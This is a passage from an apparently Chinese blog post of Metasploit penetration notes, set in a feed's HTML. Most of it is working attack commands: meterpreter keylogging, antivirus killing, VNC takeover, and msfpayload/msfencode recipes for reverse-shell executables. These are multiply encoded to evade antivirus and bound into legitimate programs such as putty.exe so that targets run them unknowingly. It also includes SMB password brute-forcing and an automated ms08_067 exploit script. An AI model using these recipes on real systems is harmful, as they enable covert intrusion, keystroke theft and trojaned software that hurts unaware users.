href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/capture/keylog_recorder //运行键盘记录模块，他自己创建本文。</span><br></pre></td></tr></table></figure><p>/root/.msf3/loot/*.txt #查看结果 </p><h3 id="进程权限迁移"><a href="#进程权限迁移" class="headerlink" title="进程权限迁移"></a>进程权限迁移</h3><p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp 进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/manage/migrate</span><br></pre></td></tr></table></figure><p>在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。</p><h3 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run killav （这个脚本要小心使用，可能导致目标机器蓝屏死机。）</span><br></pre></td></tr></table></figure><h3 id="获取系统流量"><a href="#获取系统流量" class="headerlink" title="获取系统流量"></a>获取系统流量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run packtrecorder –i 1</span><br></pre></td></tr></table></figure><h3 id="获取目标网络共享"><a href="#获取目标网络共享" class="headerlink" title="获取目标网络共享"></a>获取目标网络共享</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run scraper</span><br></pre></td></tr></table></figure><p>从目标主机获得所有网络共享等信息。并且获得的这些所有这些信息都存储在 <code>/root/.msf4/logs/scripts/scraper/directory</code> 目录下。使用 <code>ls</code> 命令查看存储的这些文件。</p><h3 id="VNC远程界面控制"><a href="#VNC远程界面控制" class="headerlink" title="VNC远程界面控制"></a>VNC远程界面控制</h3><ul><li>VNC控制命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run vnc </span><br><span class="line">meterpreter&gt; run screen_unlock</span><br></pre></td></tr></table></figure><h3 id="Windows-API编程-Hello-World弹窗"><a href="#Windows-API编程-Hello-World弹窗" class="headerlink" title="Windows API编程 , Hello World弹窗"></a>Windows API编程 , Hello World弹窗</h3><p>使用Railgun 操作windows APIs </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">[*] Starting IRB shell</span><br><span class="line">[*] The &apos;client&apos; variable holds the meterpreter client</span><br><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;Hello World&quot;,&quot;Im Title&quot;,&quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure><h3 id="编码绕过杀软"><a href="#编码绕过杀软" class="headerlink" title="编码绕过杀软"></a>编码绕过杀软</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfencode –l #列出可用编码器</span><br></pre></td></tr></table></figure><p>简单编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe</span><br></pre></td></tr></table></figure><p>使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。</p><p>多次编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | </span><br><span class="line">msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw | </span><br><span class="line">msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o </span><br><span class="line">/var/www/payload3.exe</span><br></pre></td></tr></table></figure><p>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。 </p><blockquote><p>题外：</p><p>经测试 &gt;&gt;&gt; </p><p>1：使用此命令生成的后门也被MSE 杀到；</p><p>2：未编码的后门或编码次数较少的后门可以直接被秒杀；</p><p>3：windows/x64/meterpreter/reverse_tcp 生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；</p><p>4：x86 编码器编码的后门在64 位机器上无法执行；</p><p>5：360 有个沙箱功能，后门文件右键选择“在360 隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p></blockquote><h3 id="自定义可执行程序模板"><a href="#自定义可执行程序模板" class="headerlink" title="自定义可执行程序模板"></a>自定义可执行程序模板</h3><p>msfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同<br>平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget &lt;http://download.sysinternals.com/Files/ProcessExplorer.zip&gt; </span><br><span class="line">cd work </span><br><span class="line">unzip ProcessExplorer.zip </span><br><span class="line">cd .. </span><br><span class="line">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode </span><br><span class="line">–t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5</span><br></pre></td></tr></table></figure><p>在目标机器上运行，然后本地使用msfcli 监听端口等待反弹连接： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 </span><br><span class="line">LPORT=8080 E</span><br></pre></td></tr></table></figure><h3 id="暗度陈仓—猥琐执行payload-绑定到可执行文件"><a href="#暗度陈仓—猥琐执行payload-绑定到可执行文件" class="headerlink" title="暗度陈仓—猥琐执行payload (绑定到可执行文件)"></a>暗度陈仓—猥琐执行payload (绑定到可执行文件)</h3><p>绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode </span><br><span class="line">–t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</span><br></pre></td></tr></table></figure><p>假如选择一个GUI 界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd 窗口，-k 选项的作用是payload 独立于模板软件的进程运行。</p><h3 id="MetaSploit-创建工作空间"><a href="#MetaSploit-创建工作空间" class="headerlink" title="MetaSploit 创建工作空间"></a>MetaSploit 创建工作空间</h3><p>很多时候，你要在不同的环境下，渗透不同的目标，这个时候 hosts中的IP会很乱，你就需要工作空间来区分开你每次不同的渗透环境中的操作与存储，来说说Metasploit中的 <code>workspace</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -h</span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace</span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace</span><br><span class="line">    workspace -h               Show this help information</span><br></pre></td></tr></table></figure><p>比较常用的命令：</p><p>添加工作空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a imworkspaceone</span><br><span class="line">[*] Added imworkspaceone</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure><p>选择工作空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace imworkspaceone </span><br><span class="line">[*] Workspace: imworkspaceone</span><br></pre></td></tr></table></figure><p>删除工作空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -d imworkspaceone</span><br><span class="line">[*] Deleted workspace: imworkspaceone</span><br><span class="line">[*] Switched workspace: default</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure><p>操作多个工作空间来分离渗透操作与数据。</p><h3 id="使用-Hosts-中的IP定向渗透"><a href="#使用-Hosts-中的IP定向渗透" class="headerlink" title="使用 Hosts 中的IP定向渗透"></a>使用 Hosts 中的IP定向渗透</h3><p>当你选择好了你的攻击模块的时候 ，想要将 <code>RHOSTS</code> 中的IP列表设置为<code>Hosts</code>中的IP（这里你需要Hosts中有IP才行，可以选中用 <code>db_import</code> 导入，也可以用 <code>db_nmap</code> 扫描获取）</p><p>首先配置你的攻击模块，然后 <code>show options</code> 查看需要配置目标的配置项是RHOSTS还是RHOST，当需要设置RHOSTS的时候 <code>hosts -c address -R</code> 就将hosts中所有IP地址的列表传送给了RHOSTS，执行run 向metasploit发送执行命令。</p><p>以下是一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   CONCURRENCY  10               yes       The number of concurrent ports to check per host</span><br><span class="line">   DELAY        0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS                        yes       The target address range or CIDR identifier</span><br><span class="line">   THREADS      1                yes       The number of concurrent threads</span><br><span class="line">   TIMEOUT      1000             yes       The socket connect timeout in milliseconds</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; hosts -c address -R</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address</span><br><span class="line">-------</span><br><span class="line">10.12.103.171</span><br><span class="line">10.12.103.172</span><br><span class="line">10.12.103.173</span><br><span class="line">10.12.103.174</span><br><span class="line">10.12.103.191</span><br><span class="line">10.12.103.192</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">10.14.80.212</span><br><span class="line">10.14.80.213</span><br><span class="line">10.14.80.214</span><br><span class="line">10.14.80.215</span><br><span class="line">10.14.80.216</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; file:/var/folders/0n/78ntbx595w3fll8tn5gk4t3c0000gn/T/msf-db-rhosts-20180412-7048-17nfta1</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:22 - TCP OPEN</span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:80 - TCP OPEN</span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:111 - TCP OPEN</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="常用渗透手段"><a href="#常用渗透手段" class="headerlink" title="常用渗透手段"></a>常用渗透手段</h2><h3 id="扫描匿名FTP"><a href="#扫描匿名FTP" class="headerlink" title="扫描匿名FTP"></a>扫描匿名FTP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/anonymos </span><br><span class="line">set RHOSTS 192.168.1.0/24 </span><br><span class="line">set THREADS 50 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="与nessus-结合扫描"><a href="#与nessus-结合扫描" class="headerlink" title="与nessus 结合扫描"></a>与nessus 结合扫描</h3><p>使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1/msf </span><br><span class="line">db_import /tmp/nessus_report_Host_test.nessus </span><br><span class="line">db_hosts –c address,svcs,vulns </span><br><span class="line">db_vulns</span><br></pre></td></tr></table></figure><p>在MSF 中使用Nessus： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1/msf </span><br><span class="line">load nessus </span><br><span class="line">nessus_connect nessus:toor@192.168.1.111:8834 ok </span><br><span class="line">nessus_policy_list #查看存在的扫描规则 </span><br><span class="line">nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称 </span><br><span class="line">nessus_scan_status #查看扫描进行状态 </span><br><span class="line">nessus_report_list #查看扫描结果 </span><br><span class="line">nessus_report_get skjla243-3b5d-* #导入报告 </span><br><span class="line">db_hosts –c address,svcs,vulns</span><br></pre></td></tr></table></figure><h3 id="SMB弱口令扫描"><a href="#SMB弱口令扫描" class="headerlink" title="SMB弱口令扫描"></a>SMB弱口令扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/smb/smb_login </span><br><span class="line">set RHOSTS 192.168.1.111-222 </span><br><span class="line">set SMBUser Administrator </span><br><span class="line">set SMBPass admin </span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="VNC空口令扫描"><a href="#VNC空口令扫描" class="headerlink" title="VNC空口令扫描"></a>VNC空口令扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth </span><br><span class="line">set RHOSTS 192.168.1.111 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="Open-X11空口令"><a href="#Open-X11空口令" class="headerlink" title="Open X11空口令"></a>Open X11空口令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/x11/open_x11 </span><br><span class="line">set RHOST 192.168.1.0/24 </span><br><span class="line">set THREADS 50 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="Msf自动化测试-一行命令执行"><a href="#Msf自动化测试-一行命令执行" class="headerlink" title="Msf自动化测试(一行命令执行)"></a>Msf自动化测试(一行命令执行)</h3><p>为了缩短渗透测试的时间可以将 <code>Msf</code> 命令写入一个文件，然后使用 <code>msfconsole</code> 加载执行。</p><p>加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项 </p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo ‘version’ &gt; resource.rc </span><br><span class="line">echo ‘load sounds’ &gt;&gt; resource.rc </span><br><span class="line">msfconsole –r resource.rc</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo ‘use exploit/windows/smb/ms08_067_netapi’ &gt; autoexp.rc </span><br><span class="line">echo ‘set RHOST 192.168.1.133’ &gt;&gt; autoexp.rc </span><br><span class="line">echo ‘set PAYLOAD windows/meterpreter/reverse_tcp’ &gt;&gt; autoexp.rc </span><br><span class="line">echo ‘set LHOST 192.168.1.111’ &gt;&gt; autoexp.rc </span><br><span class="line">echo ‘exploit’ &gt;&gt; autoexp.rc </span><br><span class="line">msfconsole </span><br><span class="line">msf&gt; resource autoexp.rc</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      如何使用 MetaSploit 在内网中渗透最大化，阅读全文查看内网渗透神器的利用姿势。
    
    </summary>
    
      <category term="MetaSploit 笔记" scheme="http://lfoder.github.io/categories/MetaSploit-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="MetaSploit" scheme="http://lfoder.github.io/tags/MetaSploit/"/>
    
  </entry>
  
</feed>
